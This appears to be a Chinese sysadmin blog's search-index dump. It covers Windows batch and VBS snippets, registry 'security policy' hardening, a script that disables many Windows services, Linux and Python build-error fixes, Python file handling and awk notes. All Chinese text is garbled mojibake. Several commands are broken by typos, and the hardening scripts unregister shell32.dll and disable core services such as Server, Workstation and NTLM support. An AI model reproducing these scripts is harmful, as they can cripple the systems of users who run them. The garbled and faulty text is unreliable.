è„šæœ¬åˆ›å»ºæ—¶æœ€å¥½é€‰æ‹©ANSIç¼–ç (é˜²æ­¢ä¸­æ–‡ä¹±ç ) :: @echo off è¡¨ç¤ºä¸å›æ˜¾æ‰§è¡Œçš„å‘½ä»¤ @echo off :: æ—¥æœŸæˆªå–éµä»æ ¼å¼ %date:~x,y%ï¼Œè¡¨ç¤ºä»ç¬¬xä½å¼€å§‹ï¼Œæˆªå–yä¸ªé•¿åº¦(x,yçš„èµ·å§‹å€¼ä¸º0) :: å¹´ä»½ä»ç¬¬0ä½å¼€å§‹æˆªå–4ä½ï¼Œæœˆä»½ä»ç¬¬5ä½å¼€å§‹æˆªå–2ä½ï¼Œæ—¥æœŸä»ç¬¬8ä½å¼€å§‹æˆªå–2ä½ set YEAR=%date:~0,4% set MONTH=%date:~5,2% set DAY=%date:~8,2% :: æ—¶é—´æˆªå–éµä»æ ¼å¼ %time:~x,y%ï¼Œè¡¨ç¤ºä»ç¬¬xä½å¼€å§‹ï¼Œæˆªå–yä¸ªé•¿åº¦(x,yçš„èµ·å§‹å€¼ä¸º0) :: æ—¶é’Ÿä»ç¬¬0ä½å¼€å§‹æˆªå–2ä½ï¼Œåˆ†é’Ÿä»ç¬¬3ä½å¼€å§‹æˆªå–2ä½ï¼Œç§’é’Ÿä»ç¬¬6ä½å¼€å§‹æˆªå–2ä½ set HOUR=%time:~0,2% set MINUTE=%time:~3,2% set SECOND=%time:~6,2% :: æ¯«ç§’ set MILLISECIOND=%time:~9,2% :: å½“æ—¶é’Ÿå°äºç­‰äº9æ—¶,å‰é¢æœ‰ä¸ªç©ºæ ¼ï¼Œè¿™æ—¶æˆ‘ä»¬å°‘æˆªå–ä¸€ä½ï¼Œä»ç¬¬1ä½å¼€å§‹æˆªå– set TMP_HOUR=%time:~1,1% set NINE=9 set ZERO=0 :: å¤„ç†æ—¶é’Ÿæ˜¯ä¸ªä½æ•°çš„æ—¶å€™å‰é¢è¡¥ä¸Šä¸€ä¸ª0, LEQè¡¨ç¤ºå°äºç­‰äº if %HOUR% LEQ %NINE% set HOUR=%ZERO%%TMP_HOUR% set CURRENT_DATE_TIME_STAMP=%YEAR%%MONTH%%DAY%%HOUR%%MINUTE%%SECOND%%MILLISECIOND% mkdir %CURRENT_DATE_TIME_STAMP% 9. windowså‰å°ç¨‹åºè¿è¡Œåˆ°åå° ' è¿è¡Œåˆ°åå° ' start.vbs Set ws = CreateObject(\"Wscript.Shell\") ws.run \"example.exe\",vbhide ' ' ç¨‹åºå…³é—­ ' stop.vbs Dim Wsh Set Wsh = WScript.CreateObject(\"WScript.Shell\") Wsh.Run \"taskkill /f /im example.exe\",0 Set Wsh=NoThing WScript.quit ","date":"2022-06-24","objectID":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/:0:0","tags":["windows"],"title":"Windowså‘½ä»¤æ”¶é›†","uri":"/posts/windows/%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"æœ¬åœ°å®‰å…¨ç­–ç•¥","date":"2022-06-24","objectID":"/posts/scripts/bat/%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/","tags":["bat","windows","scripts","ä¼˜åŒ–"],"title":"æœ¬åœ°å®‰å…¨ç­–ç•¥-å®‰å…¨é€‰é¡¹","uri":"/posts/scripts/bat/%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":" ::æœ¬åœ°å®‰å…¨ç­–ç•¥--å®‰å…¨é€‰é¡¹---éœ€é‡å¯ç”Ÿæ•ˆ ::å®‰å…¨é€‰é¡¹ ::ç½‘ç»œè®¿é—®ï¼šå¯è¿œç¨‹è®¿é—®çš„æ³¨å†Œè¡¨è·¯å¾„ã€€reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg\\AllowedPaths\" /v Machine /t REG_MULTI_SZ /f ::ç½‘ç»œè®¿é—®ï¼šå¯è¿œç¨‹è®¿é—®çš„æ³¨å†Œè¡¨è·¯å¾„å’Œå­è·¯å¾„ reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurePipeServers\\winreg\\AllowedExactPaths\" /v Machine /t REG_MULTI_SZ /f ::ç½‘ç»œè®¿é—®ï¼šå¯åŒ¿åè®¿é—®çš„å…±äº« reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\" /v NullSessionShares /t REG_MULTI_SZ /f ::ç½‘ç»œè®¿é—®ï¼šå¯åŒ¿åè®¿é—®çš„å‘½åç®¡é“ reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\" /v NullSessionPipes /t REG_MULTI_SZ /f ::ç½‘ç»œè®¿é—®ï¼šä¸å…è®¸SAMå¸æˆ·å’Œå…±äº«çš„åŒ¿åæšä¸¾ã€€reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsaâ€ /v restrictanonymous /t REG_DWORD /d 1 /f ::ç½‘ç»œè®¿é—®ï¼šä¸å…è®¸ä¸ºç½‘ç»œèº«ä»½éªŒè¯å‚¨å­˜å‡­è¯æˆ–.net passports reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v \"disabledomaincreds\" /t reg_dword /d 1 /f ::äº¤äº’å¼ç™»é™†ï¼šä¸æ˜¾ç¤ºä¸Šæ¬¡çš„ç”¨æˆ·å reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\" /v \"dontdisplaylastusername\" /t reg_dword /d 1 /f ::äº¤äº’å¼ç™»é™†ï¼šä¼šè¯é”å®šæ—¶æ˜¾ç¤ºç”¨æˆ·ä¿¡æ¯ reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system\" /v \"legalnoticetext\" /t reg_sz /d ä¸æ˜¾ç¤ºç”¨æˆ·ä¿¡æ¯ /f ::é‡å‘½åæ¥å®¾ç”¨æˆ· ::wmic useraccountame='guest' call Rename xxxgudsadsest net user guest /active:no wmic useraccount where name='guest' call Rename xxxgudsadsest ::ç¦ç”¨aspnetç”¨æˆ· net user aspnet /active:no ::åˆ é™¤ä¸å®‰å…¨ç»„ä»¶ regsvr32 /u wshom.ocx regsvr32 /u shell32.dll reg add \"HKEY_CURRENT_USER\\Control Panel\\International\" /v sDate /t REG_SZ /d - /f reg add \"HKEY_CURRENT_USER\\Control Panel\\International\" /v sShortDate /t REG_SZ /d yyyy-MM-dd /f reg add \"HKEY_CURRENT_USER\\Control Panel\\International\" /v sTime /t REG_SZ /d : /f reg add \"HKEY_CURRENT_USER\\Control Panel\\International\" /v sTimeFormat /t REG_SZ /d H:mm:ss /f ","date":"2022-06-24","objectID":"/posts/scripts/bat/%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/:0:0","tags":["bat","windows","scripts","ä¼˜åŒ–"],"title":"æœ¬åœ°å®‰å…¨ç­–ç•¥-å®‰å…¨é€‰é¡¹","uri":"/posts/scripts/bat/%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"å…³é—­çŸ­æ–‡å»ºç”Ÿæˆæ³¨å†Œ","date":"2022-06-24","objectID":"/posts/scripts/bat/%E5%85%B3%E9%97%AD%E7%9F%AD%E6%96%87%E5%BB%BA%E7%94%9F%E6%88%90%E6%B3%A8%E5%86%8C/","tags":["bat","windows","scripts"],"title":"å…³é—­çŸ­æ–‡å»ºç”Ÿæˆæ³¨å†Œ","uri":"/posts/scripts/bat/%E5%85%B3%E9%97%AD%E7%9F%AD%E6%96%87%E5%BB%BA%E7%94%9F%E6%88%90%E6%B3%A8%E5%86%8C/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":" Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\FileSystem] \"NtfsDisable8dot3NameCreation\"=dword:00000001 ","date":"2022-06-24","objectID":"/posts/scripts/bat/%E5%85%B3%E9%97%AD%E7%9F%AD%E6%96%87%E5%BB%BA%E7%94%9F%E6%88%90%E6%B3%A8%E5%86%8C/:0:0","tags":["bat","windows","scripts"],"title":"å…³é—­çŸ­æ–‡å»ºç”Ÿæˆæ³¨å†Œ","uri":"/posts/scripts/bat/%E5%85%B3%E9%97%AD%E7%9F%AD%E6%96%87%E5%BB%BA%E7%94%9F%E6%88%90%E6%B3%A8%E5%86%8C/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":"ç¦æ­¢windowsæœåŠ¡","date":"2022-06-24","objectID":"/posts/scripts/bat/%E7%A6%81%E6%AD%A2windows%E6%9C%8D%E5%8A%A1/","tags":["bat","windows","scripts"],"title":"ç¦æ­¢windowsæœåŠ¡","uri":"/posts/scripts/bat/%E7%A6%81%E6%AD%A2windows%E6%9C%8D%E5%8A%A1/"},{"categories":["é‚£äº›å¹´çš„æ”¶è—"],"content":" @echo off color 0A title ############ ç¦ç”¨å¹¶åœæ­¢ç³»ç»ŸæœåŠ¡ ############### echo ############ start ç¦ç”¨å¹¶åœæ­¢ç³»ç»ŸæœåŠ¡ ############### pause echo æ­£åœ¨ç¦ç”¨Computer BrowseræœåŠ¡ net stop Browser sc config Browser start= disabled echo æ­£åœ¨ç¦ç”¨Distributed File SystemæœåŠ¡ net stop Dfs sc config Dfs start= disalbed echo æ­£åœ¨ç¦ç”¨Distributed File SystemæœåŠ¡ net stop Dfs sc config Dfs start= disabled echo æ­£åœ¨ç¦ç”¨Distributed linktracking clientæœåŠ¡ net stop TrkWks sc config TrkWks start= disabled echo æ­£åœ¨ç¦ç”¨Error reporting serviceæœåŠ¡ net stop ERSvc sc config ERSvc start= disabled echo æ­£åœ¨ç¦ç”¨Messenger æœåŠ¡ net stop Messenger sc config Messenger start= disabled echo æ­£åœ¨ç¦ç”¨Windows AudioæœåŠ¡ net stop AudioSrv sc config AudioSrv start= disabled echo æ­£åœ¨ç¦ç”¨AlerteræœåŠ¡ net stop Alerter sc config Alerter start= disabled echo æ­£åœ¨ç¦ç”¨Help and Support æœåŠ¡ net stop helpsvc sc config helpsvc= disabled echo æ­£åœ¨ç¦ç”¨Indexing Service æœåŠ¡ net stop CiSvc sc config CiSvc start= disabled echo æ­£åœ¨ç¦ç”¨FTP Publishing ServiceæœåŠ¡ net stop MSFtpsvc sc config MSFtpsvc start= disabled echo æ­£åœ¨ç¦ç”¨Microsoft SerchæœåŠ¡ net stop MSSEARCH sc config MSSEARCH start= disabled echo æ­£åœ¨ç¦ç”¨NT LM Security support provideæœåŠ¡ net stop NtLmSsp sc config NtLmSsp start= disabled echo æ­£åœ¨ç¦ç”¨Portable Media Serial Number ServiceæœåŠ¡ net stop WmdmPmSN sc config WmdmPmSN start= disabled echo æ­£åœ¨ç¦ç”¨Print SpooleræœåŠ¡ net stop Spooler sc config Spooler start= disabled echo æ­£åœ¨ç¦ç”¨Remote Desktop Help Session ManageræœåŠ¡ net stop RDSessMgr sc config RDSessMgr start= disabled echo æ­£åœ¨ç¦ç”¨Remote RegistryæœåŠ¡ net stop RemoteRegistry sc config RemoteRegistry start= disabled echo æ­£åœ¨ç¦ç”¨serveræœåŠ¡ net stop lanmanserver sc config lanmanserver start= disabled pause echo ä¸‹é¢å°†ç¦ç”¨WorkstationæœåŠ¡,ç¾å›½æœåŠ¡å™¨è¯·é€‰æ‹©N,å›½å†…é€‰æ‹©Y echo æ­£åœ¨ç¦ç”¨WorkstationæœåŠ¡ net stop lanmanworkstation sc config lanmanworkstation start= disabled echo æ­£åœ¨ç¦ç”¨Routing and Remote AccessæœåŠ¡ net stop RemoteAccess sc config RemoteAccess start= disabled echo æ­£åœ¨ç¦ç”¨Help and SupportæœåŠ¡ net stop helpsvc sc config helpsvc start= disabled echo æ­£åœ¨ç¦ç”¨FTP Publishing ServiceæœåŠ¡ net stop MSFTPSVC sc config MSFTPSVC start= disabled echo æ­£åœ¨ç¦ç”¨SNMP ServiceæœåŠ¡ net stop SNMP sc config SNMP= disabled echo ç¦ç”¨coldfusion9ç›¸å…³æœåŠ¡ echo æ­£åœ¨ç¦ç”¨ColdFusion 9 .NET ServiceæœåŠ¡ net stop \"ColdFusion 9 .NET Service\" sc config \"ColdFusion 9 .NET Service\" start= disabled echo æ­£åœ¨ç¦ç”¨ColdFusion 9 ODBC AgentæœåŠ¡ net stop \"ColdFusion 9 ODBC Agent\" sc config \"ColdFusion 9 ODBC Agent\" start= disabled echo æ­£åœ¨ç¦ç”¨\"ColdFusion 9 ODBC Server\"æœåŠ¡ net stop \"ColdFusion 9 ODBC Server\" sc config \"ColdFusion 9 ODBC Server\" start= disabled echo æ­£åœ¨ç¦ç”¨ColdFusion 9 Solr ServiceæœåŠ¡ net stop CF9solr sc config CF9solr start= disabled echo æ­£åœ¨ç¦ç”¨ColdFusion 9 Search ServeræœåŠ¡ net stop \"ColdFusion 9 Search Server\" sc config \"ColdFusion 9 Search Server\" start= disabled echo ç¦ç”¨sql2008ç›¸å…³æœåŠ¡ echo æ­£åœ¨ç¦ç”¨SQL Server Integration Services 10.0æœåŠ¡ net stop MsDtsServer100 sc config MsDtsServer100 start= disabled echo æ­£åœ¨ç¦ç”¨SQL Active Directory Helper ServiceæœåŠ¡ net stop MSSQLServerADHelper100 sc config MSSQLServerADHelper100 start= disabled echo æ­£åœ¨ç¦ç”¨SQL Server BrowseræœåŠ¡ net stop SQLBrowser sc config SQLBrowser start= disabled echo æ­£åœ¨ç¦ç”¨SQL Server VSS WriteræœåŠ¡ net stop SQLWriter sc config SQLWriter start= disabled ","date":"2022-06-24","objectID":"/posts/scripts/bat/%E7%A6%81%E6%AD%A2windows%E6%9C%8D%E5%8A%A1/:0:0","tags":["bat","windows","scripts"],"title":"ç¦æ­¢windowsæœåŠ¡","uri":"/posts/scripts/bat/%E7%A6%81%E6%AD%A2windows%E6%9C%8D%E5%8A%A1/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"é‚£äº›ç¼–è¯‘æ—¶å‡ºç°çš„æ‚ä¸ƒæ‚å…«æ•…éšœ","date":"2022-06-24","objectID":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"é‚£äº›ç¼–è¯‘æ—¶å‡ºç°çš„æ‚ä¸ƒæ‚å…«æ•…éšœ","uri":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. ossec 3.3.0 ç¼–è¯‘æ•…éšœ åŠæœåŠ¡ç«¯å¯åŠ¨æ•…éšœ ## å…¨éƒ¨ä¾èµ– yum install zlib-devel pcre2-devel make gcc sqlite-devel openssl-devel libevent-devel systemd-devel ## ä¸‹è½½ https://ftp.pcre.org/pub/pcre/pcre2-10.32.tar.gz è§£å‹åˆ° src/external ä¸­ æˆ–è€…å®‰è£… pcre2-devel ## å¦ ç¼–è¯‘éœ€è¦ä¾èµ– openssl-devel ç­‰é¢å¤–åŒ… Makefile:766: recipe for target 'external/pcre2-10.32/install/lib/libpcre2-8.a' failed make: *** [external/pcre2-10.32/install/lib/libpcre2-8.a] Error 2 # server mysql æ•…éšœï¼ˆossec.confé…ç½®myslqç›¸å…³å‚æ•°åæ— æ•ˆï¼‰ ossec-dbd(5207): ERROR: OSSEC not compiled with support for 'mysql'. ossec-dbd(1202): ERROR: Configuration error at '/data/software/ossec-server/etc/ossec.conf'. Exiting. # å®‰è£…å‰éœ€è¦å¯ç”¨mysqlæ”¯æŒï¼ˆå®éªŒç‰ˆæœ¬: 3.6ï¼‰ export DATABASE=mysql export TARGET=server export USE_GEOIP=1 # client-agent/start_agent.c:15:19: fatal error: event.h: No such file or directory # éœ€è¦å®‰è£… yum install -y libevent-devel 2. rsync åŒæ­¥æ•…éšœ @ERROR: auth failed on module # å‡ºç°æ­¤é—®é¢˜çš„åŸå› å¯èƒ½æœ‰ä¸¤ä¸ª # 1. æŒ‡å®šçš„è®¤è¯æ–‡ä»¶ æƒé™é 600 # 2. æŒ‡å®šè®¤è¯æ–‡ä»¶è¡Œæœ«å°¾å­˜åœ¨æ³¨é‡Š(åˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“çš„,æˆ‘ä¸æƒ³è¯´!) 3. python 3.7.x zipimport.ZipImportError: canâ€™t decompress data; zlib not available yum -y install zlib-devel 4. python 3.7.x ModuleNotFoundError: No module named â€˜_ctypesâ€™ yum install libffi-devel -y # libffi-devel-3.0.13-18.el7.x86_64.rpm 5. python 3.7.x â€˜SSLError(â€œCanâ€™t connect to HTTPS URL because the SSL module is not available.â€)â€™ # Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'SSLError(\"Can't connect to HTTPS URL because the SSL module is not available.\")': /simple/request/ # å…ˆå®‰è£…ï¼Œåœ¨åŠ ä¸Š`--with-ssl`ç¼–è¯‘å®‰è£…ï¼Œå¯åŠ ä¸Š--enable-optimizations ï¼Œè®©pythonè¿è¡Œå¾—æ›´å¿« yum install openssl-devel -y 6. python 3.x â€™errors like : â€œCould not import runpy moduleâ€, operations as following:' # 1. gcc éœ€è¦å‡çº§åˆ°8.x + # 2. å–æ¶ˆ --enable-optimizations å‚æ•° # å¦: python 3.x ç¼–è¯‘éœ€è¦ä¾èµ–openssl 1.1.1 ./config --prefix=/pathto/openssl \u0026\u0026 make \u0026\u0026 make install 7. python 3.x â€˜ModuleNotFoundError: No module named â€˜_bz2â€™â€™ yum install bzip2-devel -y 8. python 3.x â€˜ModuleNotFoundError: No module named â€˜_lzmaâ€™â€™ sudo yum install xz-devel ","date":"2022-06-24","objectID":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"é‚£äº›ç¼–è¯‘æ—¶å‡ºç°çš„æ‚ä¸ƒæ‚å…«æ•…éšœ","uri":"/posts/other/%E9%82%A3%E4%BA%9B%E7%BC%96%E8%AF%91%E6%97%B6%E5%87%BA%E7%8E%B0%E7%9A%84%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%95%85%E9%9A%9C/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"æ–‡ä»¶æ“ä½œ","date":"2022-06-24","objectID":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/","tags":["linux","python"],"title":"æ–‡ä»¶æ“ä½œ","uri":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. æ–‡ä»¶æ“ä½œ æ–‡ä»¶è¯»å–æŒ‡é’ˆæ¦‚å¿µ å½“python ä½¿ç”¨open().read()è¯»å–æ–‡ä»¶æ—¶,æ˜¯æŒ‰è¡Œä»ä¸Šå‘ä¸‹è¯»å–,å½“ä»–è¯»å–ä¸€è¡Œæ—¶,ä¼šç»™é‚£è¡Œè®¾ç½®ä¸€ä¸ªä¸‹æ ‡(ä¸ªäººç†è§£)æ¥æ ‡æ³¨å½“å‰è¯»å–åˆ°é‚£è¡Œäº†,åœ¨å‘ä¸‹è¯»å–è¿‡ç¨‹ä¸­,ä¸‹æ ‡é€æ­¥å¢åŠ ,ç›´è‡³åˆ°æœ€åä¸€è¡Œ,è¿™ä¸ªä¸‹æ ‡å³ä¸ºæŒ‡é’ˆ. æ¨¡å¼è¯´æ˜ æ ‡è¯†ç¬¦ æè¿° æ–‡ä»¶è¦æ±‚ r åªè¯»æ¨¡å¼, åªå…è®¸è¯»å–æ–‡ä»¶å†…å®¹ æ–‡ä»¶å¿…é¡»å­˜åœ¨ r+ è¯»å†™æ¨¡å¼, å¯è¯»å¯å†™,ä¸åˆ†å…ˆå,ä½†å†™å…¥åªèƒ½å†™å…¥åˆ°æœ«å°¾è¡Œ æ–‡ä»¶å¿…é¡»å­˜åœ¨ b äºŒè¿›åˆ¶æ“ä½œæ¨¡å¼,ä½¿ç”¨åœºæ™¯ä¸€èˆ¬æ–‡æ“ä½œæµæ–‡ä»¶ - w æ–°å»ºæ¨¡å¼, å†™å…¥æ–°çš„æ–‡ä»¶å†…å®¹ è‹¥å­˜åœ¨æ–‡ä»¶,æ¸…ç©ºæ–‡ä»¶å†…å®¹,ä¸å­˜åœ¨æ–°å»º w+ å†™è¯»æ¨¡å¼, å¯ä»¥è¾¹å†™è¾¹è¯»,è¯»æ˜¯ä»å®é™…çš„æŒ‡é’ˆä½ç½®å¼€å§‹,å¯æŒ‡å®šæŒ‡é’ˆåˆ°å¼€å¤´è¯»å–å†™å…¥å†…å®¹ å­˜åœ¨æ–‡ä»¶,æ¸…ç©ºæ–‡ä»¶å†…å®¹,ä¸å­˜åœ¨æ–°å»º a è¿½åŠ æ¨¡å¼, å¯å†™ä½†ä¸å…è®¸è¯»,åªå…è®¸ä»æœ€åä¸€è¡Œå¼€å§‹è¿½åŠ  å­˜åœ¨ç›´æ¥æ“ä½œ,ä¸å­˜åœ¨æ–°å»º a+ è¿½åŠ è¯»æ¨¡å¼, å¯è¯»å¯å†™,å†™åªèƒ½å†™å…¥åˆ°æœ«å°¾è¡Œ å­˜åœ¨ç›´æ¥æ“ä½œ,ä¸å­˜åœ¨æ–°å»º U è¡¨ç¤ºåœ¨è¯»å–æ–‡ä»¶æ—¶å€™,å°†\\r\\nç»Ÿä¸€è½¬æˆ\\n, ä½¿ç”¨åœºæ™¯ä¸€èˆ¬æ˜¯åœ¨linuxä¸Šè¯»å–winçš„æ–‡ä»¶ - 1.1. åŸºç¡€è¯­æ³• # æ‰“å¼€ä¸ºæ–‡ä»¶å¯¹è±¡, é»˜è®¤ mode = \"r\", encoding=\"ç³»ç»Ÿç¼–ç \" f = open(\"file.md\") # è¯»å–æ–‡ä»¶å†…å®¹ data = f.read() f1 = open(\"file1.md\",\"w\",encoding=\"utf-8\") # å†™å…¥å†…å®¹åˆ°æ–‡ä»¶ f1.write(\"hello python\") f2 = open(\"file1.md\",\"a\",encoding=\"utf-8\") f2.write(\"hello python2\") # æ–‡ä»¶æµå…³é—­ åœ¨æŒç»­æ‰§è¡Œç¨‹åºä¸­å¿…é¡»åœ¨æ–‡ä»¶æ“ä½œå®Œæ¯•åè¿›è¡Œå…³é—­ f.close() 1.2. å¸¸è§„æ“ä½œ f = open(\"file1.md\",\"r\",encoding=\"utf-8\") # æ‰“å°ä¸€è¡Œ å¹¶å°†æŒ‡é’ˆå‘ä¸‹åç§»ä¸€æ¬¡ print(f.readline()) # è¯»å–æ‰€æœ‰è¡Œç±»å®¹,å°†å…¶è½¬æ¢ä¸ºä»¥\\nä¸ºç»“å°¾çš„åˆ—è¡¨,ä½¿ç”¨å¾ªç¯éå†æ¯ä¸€è¡Œ print(f.readlines()) # æ‰“å°å·²è¯»å–çš„å…‰æ ‡ä½ç½®(åˆ—)ä»0å¼€å§‹,å­—ç¬¦è¯»å–,å­—èŠ‚è®¡æ•°(æœ«å°¾\\n) print(f.tell()) # è¯»å–3ä¸ªå­—ç¬¦ print(f.read(3)) # è®¾ç½®ä¸Šä¸€è¯»å–è¡ŒæŒ‡é’ˆä½ç½® f.seek(2) #æ‰“å°æ–‡ä»¶ç¼–ç  print(f.encoding) # åˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ˜¯ä¸€ä¸ªå¯è¯»å–çš„æ–‡ä»¶ print(f.seekable()) # åœ¨æ–‡ä»¶å†™å…¥å,æ¸…ç©ºç¼“å­˜åŒºå†…å®¹åˆ°æ–‡ä»¶å½“ä¸­ f.flush() # åœ¨æ–‡ä»¶çš„è¿½åŠ æ¨¡å¼ä¸‹,ä»æ–‡ä»¶å¼€å¤´(0æŒ‡é’ˆ)ä½ç½®å¼€å§‹æˆªæ–­å¹¶é‡æ–°å†™å…¥æŒ‡å®šé•¿åº¦çš„å­—ç¬¦ä¸² f.truncate(6) 1.3. æ–‡ä»¶è¯»å– withè¯­å¥ with open(\"file1.md\",\"r\",encoding=\"utf-8\") as f: for line in f: print(line) # with è¯­å¥ä¹Ÿå¯ä»¥åŒæ—¶æ‰“å¼€å¤šä¸ªæ–‡ä»¶ with open(\"file1.md\",\"r\",encoding=\"utf-8\") as f1,\\ open(\"file2.md\",\"r\",encoding=\"utf-8\") as f2: print(f1.readlines()) print(f2.readlines()) ","date":"2022-06-24","objectID":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/:0:0","tags":["linux","python"],"title":"æ–‡ä»¶æ“ä½œ","uri":"/posts/python/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"AWKå¸¸ç”¨","date":"2022-06-23","objectID":"/posts/linux/awk%E5%B8%B8%E7%94%A8/","tags":["linux","awk"],"title":"AWKå¸¸ç”¨(åŠè‰ç¨¿)","uri":"/posts/linux/awk%E5%B8%B8%E7%94%A8/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":" https://awk.readthedocs.io/en/latest/chapter-one.html 1. æ‘˜è¦ awk ' BEGIN{ è¯­å¥ } statements2 {è¯­å¥} END{ è¯­å¥ } ' BEGIN { è¯­å¥ }ï¼šåœ¨è¯»å–ä»»ä½•è¾“å…¥å‰æ‰§è¡Œä¸€æ¬¡ è¯­å¥ END { è¯­å¥ }ï¼šè¯»å–æ‰€æœ‰è¾“å…¥ä¹‹åæ‰§è¡Œä¸€æ¬¡ è¯­å¥ è¡¨è¾¾å¼ { è¯­å¥ }ï¼š å¯¹äº è¡¨è¾¾å¼ ä¸ºçœŸï¼ˆå³ï¼Œéé›¶æˆ–éç©ºï¼‰çš„è¡Œï¼Œæ‰§è¡Œ è¯­å¥ /æ­£åˆ™è¡¨è¾¾å¼/ { è¯­å¥ }ï¼š å¦‚æœè¾“å…¥è¡ŒåŒ…å«å­—ç¬¦ä¸²ä¸ æ­£åˆ™è¡¨è¾¾å¼ ç›¸åŒ¹é…ï¼Œåˆ™æ‰§è¡Œ è¯­å¥ ç»„åˆæ¨¡å¼ { è¯­å¥ }ï¼š ä¸€ä¸ª ç»„åˆæ¨¡å¼ é€šè¿‡ä¸ï¼ˆ\u0026\u0026ï¼‰ï¼Œæˆ–ï¼ˆ||ï¼‰ï¼Œéï¼ˆ|ï¼‰ï¼Œä»¥åŠæ‹¬å¼§æ¥ç»„åˆå¤šä¸ªè¡¨è¾¾å¼ï¼›å¯¹äºç»„åˆæ¨¡å¼ä¸ºçœŸçš„æ¯ä¸ªè¾“å…¥è¡Œï¼Œæ‰§è¡Œ è¯­å¥ æ¨¡å¼1ï¼Œæ¨¡å¼2 { è¯­å¥ }ï¼š èŒƒå›´æ¨¡å¼(range pattern)åŒ¹é…ä»ä¸ æ¨¡å¼1 ç›¸åŒ¹é…çš„è¡Œåˆ°ä¸ æ¨¡å¼2 ç›¸åŒ¹é…çš„è¡Œï¼ˆåŒ…å«è¯¥è¡Œï¼‰ä¹‹é—´çš„æ‰€æœ‰è¡Œï¼Œå¯¹äºè¿™äº›è¾“å…¥è¡Œï¼Œæ‰§è¡Œ è¯­å¥ ã€‚ BEGINå’ŒENDä¸ä¸å…¶ä»–æ¨¡å¼ç»„åˆã€‚èŒƒå›´æ¨¡å¼ä¸å¯ä»¥æ˜¯ä»»ä½•å…¶ä»–æ¨¡å¼çš„ä¸€éƒ¨åˆ†ã€‚BEGINå’ŒENDæ˜¯ä»…æœ‰çš„å¿…é¡»æ­é…åŠ¨ä½œçš„æ¨¡å¼ã€‚ 2. awk å˜é‡ $n: åˆ†å‰²åï¼Œç¬¬nåˆ—çš„å­—æ®µ ${1..n} ä»£è¡¨å½“å‰è¡Œçš„1-nçš„åˆ—å€¼ $0: ä»£è¡¨æ•´è¡Œçš„æ•°æ® FS: è¡¨ç¤ºä½¿ç”¨çš„åˆ—çš„åˆ†å‰²ç¬¦(é»˜è®¤ç©ºæ ¼,ä½äºBEGINæ¨¡å—,å‘½ä»¤è¡Œä¸­-FæŒ‡å®š) OFS: è¾“å‡ºåˆ—çš„åˆ†å‰²ç¬¦,é»˜è®¤print $1,$2çš„æ—¶å€™ä¸­é—´çš„,ä»£è¡¨ç©ºæ ¼(é»˜è®¤),å¯ä½¿ç”¨OFSè¿›è¡Œæ›´æ”¹,ä½äºBEGINæ¨¡å—å½“ä¸­ NF: åˆ†å‰²åï¼Œå½“å‰è¡Œä¸€å…±å¤šå°‘ä¸ªå­—æ®µ($NFæœ€åä¸€åˆ—,$(NF-1)å€’æ•°ç¬¬2åˆ—) NR: è®°å½•è¡Œå·,è¡¨ç¤ºå½“å‰æ­£åœ¨å¤„ç†çš„è®°å½•çš„è¡Œçš„å·ç  FNR: 